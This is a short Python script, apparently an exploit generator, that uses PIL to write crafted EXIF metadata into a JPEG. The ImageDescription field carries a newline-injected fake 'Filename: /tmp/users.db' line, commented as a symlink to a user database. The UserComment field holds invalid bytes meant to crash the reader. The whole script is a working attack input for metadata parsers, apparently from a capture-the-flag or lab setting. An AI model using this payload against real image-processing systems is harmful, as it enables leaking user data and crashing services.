from PIL import Image

IMAGE_DESC = 0x010E
USER_COMMENT = 0x9286

input_file = "./input.jpg"
output_file = "./output.jpg"

desc_payload = "\n\nFilename:  /tmp/users.db"  # symlink to users.db
comment_payload = b'\x80\x81\x82'              # crash when reading user comment

image = Image.open(input_file)
exif = image.getexif()
exif[IMAGE_DESC] = desc_payload
exif[USER_COMMENT] = comment_payload

image.save(output_file, exif=exif)
